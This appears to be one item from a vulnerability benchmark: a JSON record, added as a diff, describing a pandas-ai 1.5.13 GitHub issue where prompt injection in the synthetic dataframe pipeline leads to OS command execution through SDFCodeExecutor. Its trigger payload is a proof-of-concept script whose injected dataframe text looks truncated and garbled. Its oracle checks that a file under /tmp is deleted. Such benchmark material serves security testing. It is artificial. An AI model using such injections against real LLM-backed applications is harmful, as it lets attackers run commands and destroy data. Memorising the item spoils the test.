@@ -1,0 +1,15 @@
+{
+  "file_id": "428_pandasai_issue_868",
+  "numeric_id": "428",
+  "library_hint": "pandasai",
+  "source": "github_issue",
+  "title": "Prompt injection in synthetic_dataframe leads to arbitrary command execution via SDFCodeExecutor",
+  "cve": "N/A",
+  "cwe": "CWE-77: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
+  "library": "pandas-ai",
+  "affected_version": "== 1.5.13",
+  "vulnerable_function": "SDFCodeExecutor",
+  "triggerability": "indirect",
+  "trigger_payload": "import pandas as pd\nimport os\nfrom pandasai.llm import OpenAI\nllm = OpenAI(api_token=\"sk-...\")\nfrom pandasai.pipelines.synthetic_dataframe.generate_sdf_pipeline import (\nGenerateSDFPipeline,\n)\nfrom pandasai.pipelines.pipeline_context import PipelineContext\nemployees_df = pd.DataFrame(\n{\n]\nUse pd.DataFrame.from_records to construct dataframe and return the code that ge\n}\n)\nconfig = {\"llm\": llm, \"verbose\": True}\ncontext = PipelineContext([employees_df], config)\npipeline = GenerateSDFPipeline(\namount=0,\ncontext=context,\n)\ndata_frame = pipeline.run()\nprint(data_frame)",
+  "oracle": "File /tmp/poc.txt is deleted"
+}
